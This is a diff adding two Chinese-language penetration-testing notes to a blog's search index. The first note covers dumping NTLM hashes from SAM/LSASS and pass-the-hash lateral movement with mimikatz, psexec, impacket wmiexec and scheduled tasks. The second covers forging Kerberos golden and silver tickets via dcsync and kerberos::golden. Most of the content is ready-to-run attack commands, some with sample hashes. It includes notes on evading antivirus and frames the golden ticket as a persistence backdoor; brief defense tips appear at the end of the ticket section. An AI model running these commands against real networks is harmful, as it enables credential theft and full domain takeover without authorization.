+<h1 id="hash获取"><a href="#hash获取" class="headerlink" title="hash获取"></a>hash获取</h1><p>sam/lsass ntlm32</p>
+<p>1、sam被占用，reg导出文件（免杀）</p>
+<pre class="highlight"><span class="line">reg save hklm\sam sam.save(部分读取)</span><br><span class="line"></span><br><span class="line">reg save hklm\system system.save</span><br><span class="line"></span><br><span class="line">reg save hklm\security security.save</span><br></pre>
+
+<p>本机运行</p>
+<p><code>mimikatz.exe &quot;lsadump::sam /sam:sam.save /system:system.save&quot; &quot;exit&quot;</code></p>
+<p>2、Get-PassHashes.ps1</p>
+<p>3、cs中hashdump、msf中kiwi抓取hash</p>
+<p>上线即免杀</p>
+<p>4、mimikatz.exe </p>
+<p>抓取明文密码的2、3步骤</p>
+<h1 id="hash传递"><a href="#hash传递" class="headerlink" title="hash传递"></a>hash传递</h1><p>原理</p>
+<p>1、net use ipc管道(只能使用明文密码，但杀软不查杀)*</p>
+<p>前提：用户在管理员组</p>
+<p><code>net use \\ip\ipc$ password /user:username</code></p>
+<p>上传文件 -&gt; 查看时间 -&gt; 定时任务</p>
+<pre class="highlight"><span class="line">copy file \\ip\c$\file</span><br><span class="line"></span><br><span class="line">net time \\ip</span><br><span class="line"></span><br><span class="line">at \\ip C:\x</span><br></pre>
+
+<p>高版本计划任务</p>
+<pre class="highlight"><span class="line">schtasks /s ip /create /sc once /f /tn note /TR file /st time</span><br><span class="line"></span><br><span class="line">schtasks /s ip /query /tn note</span><br><span class="line"></span><br><span class="line">schtasks /s ip /delete /tn note /f</span><br></pre>
+
+<p>2、mimikatz使用密码 创建token</p>
+<p>cs/msf make token</p>
+<p>命令执行依托于net use</p>
+<p><code>mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:192.168.21.188 /ntlm:feee83b95ab29980aafdbfe87c95a82c&quot; &quot;exit&quot;</code></p>
+<p>3、hash（hash传递）</p>
+<p>net use 在认证过程中，传输的是hash，没有直接传输明文密码</p>
+<p><strong>4、pstools + impacket套件</strong>*</p>
+<p>管理工具，只要完成认证，就可以进行远控：命令执行、服务管理等</p>
+<p>pstools：*</p>
+<p>首次运行，需要使用/accepteula参数不弹窗免责协议</p>
+<p>a、已经通过net use/make token创建好会话</p>
+<pre class="highlight"><span class="line">psexec /accepteula \\ip whoami</span><br><span class="line"></span><br><span class="line">pskill /accepteula \\ip /pid 12345</span><br></pre>
+
+<p>b、没有创建</p>
+<p><code>psexec -accepteula \\ip -u name -p password -s whoami</code></p>
+<p>impacket python工具</p>
+<p>a、已经通过net use/make token创建好会话</p>
+<p><del>python .\psexec.py 192.168.21.127 whoami 无法使用</del></p>
+<p>b、没有创建</p>
+<p><code>python psexec.py administrator:password@192.168.179.60 cmd</code></p>
+<p>注：对域账户操作时为/左斜杠</p>
+<p><code>python wmiexec.py administrator:password@192.168.179.60 cmd</code></p>
+<p><code>python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 administrator@192.168.179.60 cmd</code></p>
+<p>5、cs</p>
+<p>psexec、psexec_psh、psexec64等</p>
+<p>6、msf</p>
+<p>psexec模块</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>内网小结</tag>
       </tags>
   </entry>
   <entry>
@@ -9261,6 +9351,136 @@
       </categories>
       <tags>
         <tag>逻辑漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>金票银票</title>
+    <url>/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/</url>
+    <content><![CDATA[<h1 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h1><p>一种网络身份验证协议，通过加密技术为客户端、服务端应用程序提供强大的认证服务。涉及三方认证：</p>
+<p>1、访问服务的Client</p>
+<p>2、提供服务的Server</p>
+<p>3、KDC密钥分发中心，KDC又分为AS以及TGS。</p>
+<p><img src="/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/image-20210923210616717.png" alt="image-20210923210616717" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8/image-20210923210616717.png" class="lozad post-image"></p>
+<p>优点：</p>
+<p>1、高性能，拥有票据后不再需要KDC参与</p>
+<p>2、双向验证（最后一步）</p>
+<p>3、跨平台。ST票据不包含身份信息，只包含确认信息。</p>
+<p>缺点：</p>
+<p>1、对称加密，安全性降低</p>
+<p>2、集中式管理，对域控性能、安全性要求高</p>
+<p>KDC默认安装在域控中，Client和Server为域内用户或服务。Client是否有权限访问Server由KDC发放的票据决定</p>
+<h1 id="金票和银票"><a href="#金票和银票" class="headerlink" title="金票和银票"></a>金票和银票</h1><h2 id="黄金票据（留作后门）"><a href="#黄金票据（留作后门）" class="headerlink" title="黄金票据（留作后门）"></a>黄金票据（留作后门）</h2><p>使用ktbtgt哈希伪造域管账号进行域内任意主机攻击（20分钟内有效）。</p>
+<p>过程：</p>
+<p>1、在域控中获取ktbtgt的hash、sid</p>
+<pre class="highlight"><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:域名 /user:krbtgt&quot; exit		# 抓sid</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit		# 获取hash</span><br></pre>
+
+
+
+<p>2、生成黄金票据（域内主机）</p>
+<pre class="highlight"><span class="line">mimikatz.exe &quot;kerberos::golden /user:伪造的用户名 /domain:域名 /sid:user-sid  /krbtgt:ntlmhash值 /ticket:票据名称&quot; exit</span><br></pre>
+
+<p>参数说明：</p>
+<p>/admin：伪造的用户名</p>
+<p>/domain：域名称</p>
+<p>/sid：域的SID （不包括后3位）</p>
+<p>/krbtgt: krbtgt 的 NTLM-HASH 值</p>
+<p>/ticket:生成的票据名称(如：xx.tgt)</p>
+<p>3、获取权限（域内主机）</p>
+<p>清空本地票据缓存，导入伪造票据</p>
+<pre class="highlight"><span class="line">mimikatz.exe &quot;kerberos::list&quot; exit 	# 查看本地保存的票据，观察client name</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;kerberos::purge&quot; exit 	# 清理本地票据缓存</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;kerberos::ptt xx.tgt&quot; exit 票据名 	# 导入伪造的黄金票据</span><br></pre>
+
+<p>klist # cmd下查看票据</p>
+<p>* 注意：票据20分钟内有效，过期之后可以再次导入</p>
+<p><strong>4、利用</strong>*</p>
+<pre class="highlight"><span class="line">dir \\计算机全名\c$</span><br></pre>
+
+<p>注意：此处必须要用计算机全名或全名+域名，不能是ip。psexec等工具同理</p>
+<p>防御：</p>
+<p>1、限制域管理员登录到除域控制器和少数管理服务器以外的任何其他计算机</p>
+<p>这降低攻击者通过横向扩展，获取域管理员的账户，获得访问域控制器的Active Directory的ntds.dit的权限。如果攻击者无法访问AD数据库（ntds.dit文件），则无法获取到KRBTGT帐户密码。</p>
+<p>2、建议定期更改KRBTGT密码</p>
+<p>更改一次后让AD备份，并在12到24小时后再次更改它。这个过程应该对系统环境没有影响。这个过程应该是确保KRBTGT密码每年至少更改一次的标准方法。</p>
+<p>3、通过快速更改KRBTGT密码两次，使黄金票据失效</p>
+<p>一旦攻击者获得了KRBTGT帐号密码哈希的访问权限，就可以随意创建黄金票据。通过快速更改KRBTGT密码两次，使任何现有的黄金票据（以及所有活动的Kerberos票据）失效，可以消除攻击者使用其KRBTGT创建有效金票的能力。</p>
+<h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><p>通过伪造服务端的hash可以攻击伪造服务端。</p>
+<p>前提：</p>
+<p>1、域名称</p>
+<p>2、域的 SID 值</p>
+<p>3、域的服务账户的密码HASH</p>
+<p>4、伪造的用户名，可以是任意用户名，一般是伪造administrator</p>
+<p>5、需要访问的服务</p>
+<p>过程：</p>
+<p>1、用域管理员账号登录主域控，使用 mimikatz.exe 执行命令抓取hash和sid（在域控中执行）</p>
+<pre class="highlight"><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:域名 /user:krbtgt&quot; exit		# 获取sid</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit		# 获取hash</span><br></pre>
+
+<p>2、伪造票据。得到服务账户的 HASH 之后使用 mimikatz中的kerberos::golden功能生成白银票据TGS ticket。</p>
+<pre class="highlight"><span class="line">mimikatz.exe kerberos::golden /domain:域名 /sid:SID值 /target:目标主机 /rc4:目标主机的HASH值（NTLM）/service:需要伪造的服务 /user:伪造的用户名 /ptt</span><br></pre>
+
+<p>参数：</p>
+<p>/domain：指定域名</p>
+<p>/sid：sid号（除最后一部分）</p>
+<p>/target：目标主机计算机名或ip</p>
+<p>/rc4：目标主机的hash(NTLM)</p>
+<p>/service：需要伪造的服务</p>
+<p>/user：需要伪造的用户名</p>
+<p>/ppt：伪造了以后直接写入到内存中</p>
+<p>服务类型表：</p>
+<table>
+<thead>
+<tr>
+<th>服务类型</th>
+<th>白银票据对应的服务名</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WMI</td>
+<td>HOST/RPCSS</td>
+</tr>
+<tr>
+<td>PowerShell  Remoting</td>
+<td>HOST/HOST</td>
+</tr>
+<tr>
+<td>WinRM</td>
+<td>HOST/HTTP</td>
+</tr>
+<tr>
+<td>Scheduled  Tasks</td>
+<td>HOST</td>
+</tr>
+<tr>
+<td>Windows File Share (CIFS–net use)</td>
+<td>CIFS</td>
+</tr>
+<tr>
+<td>LDAP  operations including Mimikatz DCSync</td>
+<td>LDAP</td>
+</tr>
+<tr>
+<td>Windows  Remote Server Administration Tools</td>
+<td>RPCSS/LDAP/CIFS</td>
+</tr>
+</tbody></table>
+<p>注：sid在域内任何主机都可以拿到</p>
+<p><strong>3、利用</strong>*</p>
+<pre class="highlight"><span class="line">dir \\计算机全名\c$</span><br></pre>
+
+<p>注意：此处必须要用计算机全名或全名+域名，不能是ip。必须使用pstools中的psexec</p>
+<p>注意：创建的服务票据智只能用于该服务的命令执行</p>
+<p>防御：</p>
+<p>通过开启PAC(Privileged Attribute Certificate)特权属性证书保护功能。开启PAC后，PAC会将client发送的票</p>
+<p>据ticket发送给KDC，由KDC进行验证ticket是否有效，就可以使所伪造的票据无法进行利用。</p>
+<p>在Server端开启的方式是更改注册表中的一个值，将</p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</p>
+<p>中的ValidateKdcPacSignature设为1</p>
+<p>其他：</p>
+<p>ADfind可以抓到sid(winserver2008、2012)</p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>票据使用</tag>
       </tags>
   </entry>
 </search>
